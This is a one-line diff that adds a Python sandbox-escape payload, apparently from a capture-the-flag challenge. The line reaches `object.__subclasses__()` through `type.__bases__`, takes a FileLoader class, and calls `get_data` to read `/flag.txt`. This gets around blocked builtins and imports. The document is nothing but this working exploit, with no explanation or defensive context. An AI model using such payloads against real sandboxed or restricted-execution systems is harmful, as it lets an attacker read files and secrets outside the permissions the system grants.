@@ -1,0 +1,1 @@
+getattr([c for c in getattr(getattr(type,'__bases__')[0],'__subclasses__')() if 'FileLoader' in str(c)][0]('x','/flag.txt'),'get_data')('/flag.txt')
